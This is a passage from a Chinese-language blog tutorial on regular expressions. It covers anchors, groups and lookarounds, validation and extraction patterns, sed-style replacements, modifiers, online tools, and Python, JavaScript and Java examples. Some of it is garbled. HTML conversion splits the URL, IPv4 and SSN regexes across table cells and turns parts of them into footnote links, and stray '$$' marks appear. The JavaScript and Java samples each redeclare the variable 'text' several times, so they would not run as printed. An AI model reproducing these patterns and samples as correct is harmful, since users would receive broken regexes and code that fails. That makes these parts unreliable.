style="text-align:left"><code>&#123;n,m&#125;?</code></td><td style="text-align:left">非贪心匹配，匹配前面的字符或子模式至少 <code>n</code> 次，最多 <code>m</code> 次，尽可能少地匹配</td><td style="text-align:left"><code>a&#123;1,3&#125;?</code> 匹配 <code>a</code>、<code>aa</code>、<code>aaa</code>，但会优先尝试更短的匹配</td></tr></tbody></table></div><h3 id="（三）位置匹配"><a href="#（三）位置匹配" class="headerlink" title="（三）位置匹配"></a>（三）位置匹配</h3><div class="table-container"><table><thead><tr><th style="text-align:left">表达式</th><th style="text-align:left">描述</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>^</code></td><td style="text-align:left">匹配字符串的开头</td><td style="text-align:left"><code>^a</code> 可以匹配以 <code>a</code> 开头的字符串</td></tr><tr><td style="text-align:left">$$`</td><td style="text-align:left">匹配字符串的结尾</td><td style="text-align:left"><code>a$$ 可以匹配以</code>a` 结尾的字符串</td></tr><tr><td style="text-align:left"><code>\b</code></td><td style="text-align:left">匹配单词边界</td><td style="text-align:left"><code>\bword\b</code> 可以匹配独立的单词 <code>word</code>，但不会匹配 <code>wording</code> 中的 <code>word</code></td></tr><tr><td style="text-align:left"><code>\B</code></td><td style="text-align:left">匹配非单词边界</td><td style="text-align:left"><code>\Bword\B</code> 可以匹配 <code>wording</code> 中的 <code>word</code>，但不会匹配独立的单词 <code>word</code></td></tr><tr><td style="text-align:left"><code>^</code>（多行模式）</td><td style="text-align:left">在多行模式下，匹配每一行的开头</td><td style="text-align:left"><code>(?m)^a</code> 可以匹配多行字符串中以 <code>a</code> 开头的每一行</td></tr><tr><td style="text-align:left">$$`（多行模式）</td><td style="text-align:left">在多行模式下，匹配每一行的结尾</td><td style="text-align:left"><code>(?m)a$$ 可以匹配多行字符串中以</code>a` 结尾的每一行</td></tr></tbody></table></div><h3 id="（四）分组与引用"><a href="#（四）分组与引用" class="headerlink" title="（四）分组与引用"></a>（四）分组与引用</h3><div class="table-container"><table><thead><tr><th style="text-align:left">表达式</th><th style="text-align:left">描述</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>()</code></td><td style="text-align:left">分组，将多个字符或子模式组合在一起作为一个整体进行匹配和操作</td><td style="text-align:left"><code>(ab)+</code> 可以匹配 <code>ab</code>、<code>abab</code> 等</td></tr><tr><td style="text-align:left"><code>\1</code>、<code>\2</code></td><td style="text-align:left">引用前面的分组，<code>\1</code> 引用第一个分组，<code>\2</code> 引用第二个分组等</td><td style="text-align:left"><code>(\d+)\.\1</code> 可以匹配 <code>123.123</code>、<code>456.456</code> 等，其中 <code>\1</code> 引用了第一个分组 <code>(\d+)</code></td></tr><tr><td style="text-align:left"><code>(?:...)</code></td><td style="text-align:left">非捕获分组，将多个字符或子模式组合在一起，但不进行捕获</td><td style="text-align:left"><code>(?:ab)+</code> 可以匹配 <code>ab</code>、<code>abab</code> 等，但不会捕获分组内容</td></tr><tr><td style="text-align:left"><code>(?=...)</code></td><td style="text-align:left">正向肯定预查，在匹配的当前位置，确保其后能匹配指定的模式，但不消耗字符</td><td style="text-align:left"><code>(?=\d+)</code> 可以在当前位置后匹配任意数字，但不包括数字本身</td></tr><tr><td style="text-align:left"><code>(?!...)</code></td><td style="text-align:left">正向否定预查，在匹配的当前位置，确保其后不能匹配指定的模式，不消耗字符</td><td style="text-align:left"><code>(?!abc)</code> 可以在当前位置后确保不匹配 <code>abc</code></td></tr><tr><td style="text-align:left"><code>(?&lt;=...)</code></td><td style="text-align:left">反向肯定预查，在匹配的当前位置，确保其前能匹配指定的模式，不消耗字符</td><td style="text-align:left"><code>(?&lt;=abc)</code> 可以在当前位置前匹配 <code>abc</code>，但不包括 <code>abc</code> 本身</td></tr><tr><td style="text-align:left"><code>(?&lt;!...)</code></td><td style="text-align:left">反向否定预查，在匹配的当前位置，确保其前不能匹配指定的模式，不消耗字符</td><td style="text-align:left"><code>(?&lt;!abc)</code> 可以在当前位置前确保不匹配 <code>abc</code></td></tr></tbody></table></div><h2 id="三、常见应用场景"><a href="#三、常见应用场景" class="headerlink" title="三、常见应用场景"></a>三、常见应用场景</h2><h3 id="（一）验证数据格式"><a href="#（一）验证数据格式" class="headerlink" title="（一）验证数据格式"></a>（一）验证数据格式</h3><div class="table-container"><table><thead><tr><th style="text-align:left">验证内容</th><th style="text-align:left">正则表达式</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left">邮件地址</td><td style="text-align:left"><code>^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$</code></td><td style="text-align:left">匹配常见的电子邮件地址，如 <code>user@example.com</code></td></tr><tr><td style="text-align:left">手机号码（中国大陆）</td><td style="text-align:left"><code>^1[3-9]\d&#123;9&#125;$</code></td><td style="text-align:left">匹配中国大陆手机号码，如 <code>13812345678</code></td></tr><tr><td style="text-align:left">身份证号码</td><td style="text-align:left"><code>^\d&#123;15&#125;(\d&#123;2&#125;[0-9xX])?$</code></td><td style="text-align:left">匹配 15 位或 18 位身份证号码，如 <code>123456789012345678</code></td></tr><tr><td style="text-align:left">URL</td><td style="text-align:left">`^(https?</td><td style="text-align:left">ftp)://<sup><a href="#fn_\s/$.?#" id="reffn_\s/$.?#">\s/$.?#</a></sup>.<sup><a href="#fn_\s" id="reffn_\s">\s</a></sup>*$`</td><td>匹配常见的 URL，如 <code>http://example.com</code>、<code>https://example.com/page</code></td></tr><tr><td style="text-align:left">IPv4 地址</td><td style="text-align:left">`^(25[0-5]</td><td style="text-align:left">2[0-4]\d</td><td>1\d{2}</td><td>[1-9]?\d).(25[0-5]</td><td>2[0-4]\d</td><td>1\d{2}</td><td>[1-9]?\d).(25[0-5]</td><td>2[0-4]\d</td><td>1\d{2}</td><td>[1-9]?\d).(25[0-5]</td><td>2[0-4]\d</td><td>1\d{2}</td><td>[1-9]?\d)$`</td><td>匹配合法的 IPv4 地址，如 <code>192.168.0.1</code></td></tr><tr><td style="text-align:left">日期（YYYY-MM-DD）</td><td style="text-align:left"><code>^\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;$</code></td><td style="text-align:left">匹配日期格式，如 <code>2024-10-01</code></td></tr><tr><td style="text-align:left">货币金额</td><td style="text-align:left"><code>^\d+(\.\d&#123;2&#125;)?$</code></td><td style="text-align:left">匹配货币金额，如 <code>123</code>、<code>123.45</code></td></tr><tr><td style="text-align:left">银行卡号</td><td style="text-align:left"><code>^\d&#123;16,19&#125;$</code></td><td style="text-align:left">匹配常见的银行卡号，如 <code>1234567890123456</code></td></tr><tr><td style="text-align:left">社交安全号码（SSN）</td><td style="text-align:left">`^(?!000</td><td style="text-align:left">666</td><td>9\d{2})\d{3}-(?!00)\d{2}-(?!0000)\d{4}$`</td><td>匹配美国 SSN 号码，如 <code>123-45-6789</code></td></tr><tr><td style="text-align:left">域名</td><td style="text-align:left"><code>^([a-zA-Z0-9]([a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?\.)+[a-zA-Z]&#123;2,&#125;$</code></td><td style="text-align:left">匹配域名，如 <code>example.com</code>、<code>sub.domain.co.uk</code></td></tr></tbody></table></div><h3 id="（二）提取特定信息"><a href="#（二）提取特定信息" class="headerlink" title="（二）提取特定信息"></a>（二）提取特定信息</h3><div class="table-container"><table><thead><tr><th style="text-align:left">提取内容</th><th style="text-align:left">正则表达式</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left">HTML 标签内容</td><td style="text-align:left"><code>&lt;[^&gt;]+&gt;([^&lt;]+)&lt;/[^&gt;]+&gt;</code></td><td style="text-align:left">从 HTML 中提取标签内容，如 <code>&lt;p&gt;Hello&lt;/p&gt;</code> 提取 <code>Hello</code></td></tr><tr><td style="text-align:left">URL 参数</td><td style="text-align:left"><code>[?&amp;]([^=&amp;]+)=([^&amp;]*)</code></td><td style="text-align:left">从 URL 中提取参数，如 <code>?page=1&amp;size=10</code> 提取 <code>page=1</code> 和 <code>size=10</code></td></tr><tr><td style="text-align:left">日志文件中的时间戳</td><td style="text-align:left"><code>\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;</code></td><td style="text-align:left">从日志文件中提取时间戳，如 <code>2024-10-01 12:34:56</code></td></tr><tr><td style="text-align:left">日志文件中的 IP 地址</td><td style="text-align:left"><code>\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b</code></td><td style="text-align:left">从日志文件中提取 IP 地址，如 <code>192.168.0.1</code></td></tr><tr><td style="text-align:left">文本中的电话号码</td><td style="text-align:left"><code>\d&#123;3&#125;-\d&#123;3&#125;-\d&#123;4&#125;</code></td><td style="text-align:left">提取电话号码，如 <code>123-456-7890</code></td></tr><tr><td style="text-align:left">文本中的日期</td><td style="text-align:left"><code>\b\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;\b</code></td><td style="text-align:left">提取日期，如 <code>2024-10-01</code></td></tr><tr><td style="text-align:left">文本中的邮箱地址</td><td style="text-align:left"><code>\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b</code></td><td style="text-align:left">提取邮箱地址，如 <code>user@example.com</code></td></tr><tr><td style="text-align:left">文本中的 URL</td><td style="text-align:left"><code>\bhttps?://[^\s]+</code></td><td style="text-align:left">提取 URL，如 <code>http://example.com</code></td></tr><tr><td style="text-align:left">文本中的信用卡号</td><td style="text-align:left">`\b(?:\d{4}-){3}\d{4}</td><td style="text-align:left">\b\d{16}\b`</td><td>提取信用卡号，如 <code>1234-5678-9012-3456</code> 或 <code>1234567890123456</code></td></tr><tr><td style="text-align:left">文本中的价格</td><td style="text-align:left"><code>\b\d+(\.\d&#123;2&#125;)?\b</code></td><td style="text-align:left">提取价格，如 <code>123</code> 或 <code>123.45</code></td></tr></tbody></table></div><h3 id="（三）替换文本内容"><a href="#（三）替换文本内容" class="headerlink" title="（三）替换文本内容"></a>（三）替换文本内容</h3><div class="table-container"><table><thead><tr><th style="text-align:left">替换内容</th><th style="text-align:left">正则表达式</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left">多个空格替换为一个</td><td style="text-align:left"><code>s/\s+/ /g</code></td><td style="text-align:left">将文本中的多个连续空格替换为一个空格，如 <code>Hello   World</code> 替换为 <code>Hello World</code></td></tr><tr><td style="text-align:left">日期格式转换</td><td style="text-align:left"><code>s/(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/\3-\2-\1/g</code></td><td style="text-align:left">将日期格式从 <code>YYYY-MM-DD</code> 替换为 <code>DD-MM-YYYY</code>，如 <code>2024-10-01</code> 替换为 <code>01-10-2024</code></td></tr><tr><td style="text-align:left">URL 参数排序</td><td style="text-align:left"><code>s/([&amp;?])([^\s&amp;]+)=([^\s&amp;]+)([&amp;])([^\s&amp;]+)=([^\s&amp;]+)/\1\5=\6\4\2=\3/g</code></td><td style="text-align:left">对 URL 参数进行排序，如 <code>?b=2&amp;a=1</code> 替换为 <code>?a=1&amp;b=2</code></td></tr><tr><td style="text-align:left">HTML 标签转换</td><td style="text-align:left"><code>s/&lt;[^&gt;]+&gt;//g</code></td><td style="text-align:left">去除 HTML 标签，如 <code>&lt;p&gt;Hello&lt;/p&gt;</code> 替换为 <code>Hello</code></td></tr><tr><td style="text-align:left">转义特殊字符</td><td style="text-align:left"><code>s/([&lt;&gt;&amp;&#39;&quot;/])/\\\$1/g</code></td><td style="text-align:left">转义 HTML 特殊字符，如 <code>&lt;</code> 替换为 <code>&amp;lt;</code></td></tr><tr><td style="text-align:left">标准化电话号码</td><td style="text-align:left"><code>s/(\d&#123;3&#125;)-(\d&#123;3&#125;)-(\d&#123;4&#125;)/(\1) \2-\3/g</code></td><td style="text-align:left">将电话号码格式标准化，如 <code>123-456-7890</code> 替换为 <code>(123) 456-7890</code></td></tr><tr><td style="text-align:left">转换为小写</td><td style="text-align:left"><code>s/[A-Z]/\l&amp;/g</code></td><td style="text-align:left">将文本转换为小写，如 <code>Hello World</code> 替换为 <code>hello world</code></td></tr><tr><td style="text-align:left">转换为大写</td><td style="text-align:left"><code>s/[a-z]/\u&amp;/g</code></td><td style="text-align:left">将文本转换为大写，如 <code>hello world</code> 替换为 <code>HELLO WORLD</code></td></tr><tr><td style="text-align:left">首字母大写</td><td style="text-align:left">`s/(^</td><td style="text-align:left">\s)([a-z])/\1\u\2/g`</td><td>将每个单词的首字母大写，如 <code>hello world</code> 替换为 <code>Hello World</code></td></tr></tbody></table></div><h2 id="四、常用修饰符"><a href="#四、常用修饰符" class="headerlink" title="四、常用修饰符"></a>四、常用修饰符</h2><div class="table-container"><table><thead><tr><th style="text-align:left">修饰符</th><th style="text-align:left">描述</th><th style="text-align:left">示例及说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>i</code></td><td style="text-align:left">忽略大小写</td><td style="text-align:left"><code>/abc/i</code> 匹配 <code>abc</code>、<code>Abc</code>、<code>ABC</code> 等</td></tr><tr><td style="text-align:left"><code>g</code></td><td style="text-align:left">全局匹配，查找所有匹配而非在第一个匹配后停止</td><td style="text-align:left"><code>/abc/g</code> 在字符串中查找所有 <code>abc</code> 匹配</td></tr><tr><td style="text-align:left"><code>m</code></td><td style="text-align:left">多行模式，<code>^</code> 和 $$` 匹配每一行的开头和结尾</td><td style="text-align:left"><code>(?m)^abc$$ 匹配多行字符串中每一行以</code>abc` 开头和结尾的行</td></tr><tr><td style="text-align:left"><code>s</code></td><td style="text-align:left">单行模式，<code>.</code> 匹配包括换行符在内的所有字符</td><td style="text-align:left"><code>(?s).+</code> 匹配包括换行符在内的所有字符</td></tr><tr><td style="text-align:left"><code>u</code></td><td style="text-align:left">Unicode 模式，支持 Unicode 字符</td><td style="text-align:left"><code>/abc/u</code> 支持 Unicode 字符匹配</td></tr><tr><td style="text-align:left"><code>x</code></td><td style="text-align:left">扩展模式，忽略模式中的空白字符和注释</td><td style="text-align:left"><code>(?x)\d+ # 匹配数字</code> 匹配数字，忽略注释和空白</td></tr></tbody></table></div><h2 id="五、正则表达式工具推荐"><a href="#五、正则表达式工具推荐" class="headerlink" title="五、正则表达式工具推荐"></a>五、正则表达式工具推荐</h2><h3 id="（一）在线正则表达式测试工具"><a href="#（一）在线正则表达式测试工具" class="headerlink" title="（一）在线正则表达式测试工具"></a>（一）在线正则表达式测试工具</h3><div class="table-container"><table><thead><tr><th style="text-align:left">工具名称</th><th style="text-align:left">网址</th><th style="text-align:left">特点</th></tr></thead><tbody><tr><td style="text-align:left">Regex101</td><td style="text-align:left"><a href="https://regex101.com/">https://regex101.com/</a></td><td style="text-align:left">支持多种编程语言，提供详细的匹配结果和解释，支持在线调试和修改</td></tr><tr><td style="text-align:left">正则表达式在线测试</td><td style="text-align:left"><a href="https://tool.oschina.net/regex">https://tool.oschina.net/regex</a></td><td style="text-align:left">国内工具，支持中文，界面简洁，操作方便</td></tr><tr><td style="text-align:left">Debuggex</td><td style="text-align:left"><a href="https://debuggex.com/">https://debuggex.com/</a></td><td style="text-align:left">以可视化的方式展示正则表达式的匹配过程，帮助理解复杂的匹配逻辑</td></tr><tr><td style="text-align:left">Regexr</td><td style="text-align:left"><a href="https://regexr.com/">https://regexr.com/</a></td><td style="text-align:left">提供丰富的示例和教程，支持实时测试和调试，支持多种正则表达式引擎</td></tr></tbody></table></div><h3 id="（二）编程语言中的正则表达式库"><a href="#（二）编程语言中的正则表达式库" class="headerlink" title="（二）编程语言中的正则表达式库"></a>（二）编程语言中的正则表达式库</h3><div class="table-container"><table><thead><tr><th style="text-align:left">编程语言</th><th style="text-align:left">库名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Python</td><td style="text-align:left"><code>re</code></td><td style="text-align:left">Python 的内置正则表达式库，功能强大，支持丰富的正则表达式操作</td></tr><tr><td style="text-align:left">JavaScript</td><td style="text-align:left"><code>RegExp</code></td><td style="text-align:left">JavaScript 的内置正则表达式对象，广泛用于前端和 Node.js 开发</td></tr><tr><td style="text-align:left">Java</td><td style="text-align:left"><code>java.util.regex</code></td><td style="text-align:left">Java 的正则表达式库，功能全面，支持复杂的正则表达式操作</td></tr><tr><td style="text-align:left">PHP</td><td style="text-align:left"><code>preg</code></td><td style="text-align:left">PHP 的 PCRE（Perl 兼容正则表达式）库，功能强大，广泛用于 Web 开发</td></tr><tr><td style="text-align:left">C#</td><td style="text-align:left"><code>System.Text.RegularExpressions</code></td><td style="text-align:left">.NET 的正则表达式库，功能丰富，支持多种正则表达式操作</td></tr><tr><td style="text-align:left">Ruby</td><td style="text-align:left"><code>Regexp</code></td><td style="text-align:left">Ruby 的内置正则表达式库，语法简洁，易于使用</td></tr></tbody></table></div><h2 id="六、正则表达式在不同编程语言中的使用示例"><a href="#六、正则表达式在不同编程语言中的使用示例" class="headerlink" title="六、正则表达式在不同编程语言中的使用示例"></a>六、正则表达式在不同编程语言中的使用示例</h2><h3 id="（一）Python"><a href="#（一）Python" class="headerlink" title="（一）Python"></a>（一）Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配验证</span></span><br><span class="line">pattern = <span class="string">r&#x27;^\d&#123;3&#125;-\d&#123;3&#125;-\d&#123;4&#125;$&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;123-456-7890&#x27;</span></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(pattern, text)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;匹配成功&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;匹配失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索表</span></span><br><span class="line">text = <span class="string">&#x27;Hello 123 World 456&#x27;</span></span><br><span class="line">new_text = re.sub(<span class="string">r&#x27;\d+&#x27;</span>, <span class="string">&#x27;NUM&#x27;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(new_text)  <span class="comment"># 输出: Hello NUM World NUM</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取信息</span></span><br><span class="line">text = <span class="string">&#x27;Email: user@example.com, Phone: 123-456-7890&#x27;</span></span><br><span class="line">emails = re.findall(<span class="string">r&#x27;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b&#x27;</span>, text)</span><br><span class="line">phones = re.findall(<span class="string">r&#x27;\d&#123;3&#125;-\d&#123;3&#125;-\d&#123;4&#125;&#x27;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(emails)  <span class="comment"># 输出: [&#x27;user@example.com&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(phones)  <span class="comment"># 输出: [&#x27;123-456-7890&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="（二）JavaScript"><a href="#（二）JavaScript" class="headerlink" title="（二）JavaScript"></a>（二）JavaScript</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 匹配验证</span></span><br><span class="line"><span class="keyword">const</span> pattern = <span class="regexp">/^\d&#123;3&#125;-\d&#123;3&#125;-\d&#123;4&#125;$/</span>;</span><br><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;123-456-7890&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (pattern.<span class="title function_">test</span>(text)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;匹配成功&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;匹配失败&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索网页</span></span><br><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;Hello 123 World 456&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> new_text = text.<span class="title function_">replace</span>(<span class="regexp">/\d+/g</span>, <span class="string">&#x27;NUM&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(new_text);  <span class="comment">// 输出: Hello NUM World NUM</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取信息</span></span><br><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;Email: user@example.com, Phone: 123-456-7890&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> emails = text.<span class="title function_">match</span>(<span class="regexp">/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b/g</span>);</span><br><span class="line"><span class="keyword">const</span> phones = text.<span class="title function_">match</span>(<span class="regexp">/\d&#123;3&#125;-\d&#123;3&#125;-\d&#123;4&#125;/g</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(emails);  <span class="comment">// 输出: [&#x27;user@example.com&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(phones);  <span class="comment">// 输出: [&#x27;123-456-7890&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="（三）Java"><a href="#（三）Java" class="headerlink" title="（三）Java"></a>（三）Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 匹配验证</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">pattern</span> <span class="operator">=</span> <span class="string">&quot;^\\d&#123;3&#125;-\\d&#123;3&#125;-\\d&#123;4&#125;$&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;123-456-7890&quot;</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">matches</span> <span class="operator">=</span> Pattern.matches(pattern, text);</span><br><span class="line">        System.out.println(matches ? <span class="string">&quot;匹配成功&quot;</span> : <span class="string">&quot;匹配失败&quot;</span>);  <span class="comment">// 输出: 匹配成功</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换文本</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;Hello 123 World 456&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">new_text</span> <span class="operator">=</span> text.replaceAll(<span class="string">&quot;\\d+&quot;</span>, <span class="string">&quot;NUM&quot;</span>);</span><br><span class="line">        System.out.println(new_text);  <span class="comment">// 输出: Hello NUM World NUM</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提取信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;Email: user@example.com, Phone: 123-456-7890&quot;</span>;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">emailPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]&#123;2,&#125;\\b&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">emailMatcher</span> <span class="operator">=</span> emailPattern.matcher(text);</span><br><span class="line">        <span class="keyword">while</span> (emailMatcher.find()) &#123;</span><br><span class="line">            System.out.println(emailMatcher.group());  <span class="comment">// 输出: user@example.com</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">phonePattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;\\d&#123;3&#125;-\\d&#123;3&#125;-\\d&#123;4&#125;&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">phoneMatcher</span> <span class="operator">=</span> phonePattern.matcher(text);</span><br><span class="line">        <span class="keyword">while</span> (phoneMatcher.find()) &#123;</span><br><span class="line">            System.out.println(phoneMatcher.group());  <span class="comment">// 输出: 123-456-7890</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="七、注意事项"><a href="#七、注意事项" class="headerlink" title="七、注意事项"></a>七、注意事项</h2><h3 id="（一）性能问题"><a href="#（一）性能问题" class="headerlink" title="（一）性能问题"></a>（一）性能问题</h3><ul><li><strong>避免过度使用正则表达式</strong>：正则表达式虽然强大，但过度使用会导致代码可读性下降和性能问题。对于简单的字符串操作，优先考虑使用字符串方法（如 <code>split</code>、<code>replace</code> 等）。</li><li><strong>优化复杂的正则表达式</strong>：避免使用过于复杂的模式，尽量使用非捕获分组 <code>?:</code> 和非贪心匹配来提高性能。</li><li><strong>使用预编译</strong>：在需要多次使用同一个正则表达式时，提前编译正则表达式可以提高性能，如 Java 中的 <code>Pattern.compile</code> 和 Python 中的 <code>re.compile</code>。</li></ul><h3 id="（二）特殊字符转义"><a href="#（二）特殊字符转义" class="headerlink" title="（二）特殊字符转义"></a>（二）特殊字符转义</h3><ul><li><strong>反斜杠转义</strong>：在正则表达式中，一些特殊字符（如 <code>.</code>、<code>*</code>、<code>+</code>、<code>?</code>、<code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>、<code>&#123;</code>、<code>&#125;</code>、<code>^</code>、<code>$</code>、<code>\</code> 等）具有特殊含义，如果需要匹配这些字符本身，需要使用反斜杠 <code>\</code> 进行转义。例如，要匹配 <code>.</code>，应使用 <code>\.</code>。</li><li><strong>编程语言中的转义</strong>：在某些编程语言中（如 Python、Java 等），反斜杠本身需要转义，因此需要使用双反斜杠 <code>\\</code>。例如，在 Python 中匹配 <code>\d</code> 需要写成 <code>\\d</code>。</li></ul><h3 id="（三）贪心与非贪心匹配"><a href="#（三）贪心与非贪心匹配" class="headerlink" title="（三）贪心与非贪心匹配"></a>（三）贪心与非贪心匹配</h3><ul><li><strong>贪心匹配</strong>：默认情况下，正则表达式中的数量匹配符号（如 <code>*</code>、<code>+</code>、<code>?</code>、<code>&#123;n,m&#125;</code> 等）是贪心的，会尽可能多地匹配字符。例如，<code>&lt;.*&gt;</code> 会匹配 <code>&lt;html&gt;...&lt;/html&gt;</code> 中的整个字符串。</li><li><strong>非贪心匹配</strong>：如果需要非贪心匹配，可以在数量匹配符号后添加 <code>?</code>。例如，<code>&lt;.*?&gt;</code> 会匹配 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 等尽可能少的字符。</li></ul><h3 id="（四）常见问题与解决方法"><a href="#（四）常见问题与解决方法" class="headerlink" title="（四）常见问题与解决方法"></a>（四）常见问题与解决方法</h3><ul><li><strong>匹配换行符</strong>：默认情况下，<code>.</code> 不匹配换行符 <code>\n</code>。如果需要匹配包括换行符在内的所有字符，可以使用单行模式 <code>s</code> 修饰符。例如，<code>(?s).+</code> 会匹配包括换行符在内的所有字符。</li><li><strong>多行模式匹配</strong>：在多行字符串中，如果需要匹配每一行的开头或结尾，可以使用多行模式 <code>m</code> 修饰符。例如，<code>(?m)^abc$</code> 会匹配多行字符串中每一行以 <code>abc</code> 开头和结尾的行。</li><li><strong>处理 Unicode 字符</strong>：在处理 Unicode 字符时，确保使用支持 Unicode 的正则表达式库，并添加 <code>u</code> 修饰符。例如，在 JavaScript 中使用 <code>/abc/u</code> 来匹配 Unicode 字符。</li></ul><h2 id="八、正则表达式学习资源"><a href="#八、正则表达式学习资源" class="headerlink" title="八、正则表达式学习资源"></a>八、正则表达式学习资源</h2><h3 id="（一）书籍"><a href="#（一）书籍" class="headerlink" title="（一）书籍"></a>（一）书籍</h3><div class="table-container"><table><thead><tr><th style="text-align:left">书名</th><th style="text-align:left">作者</th><th 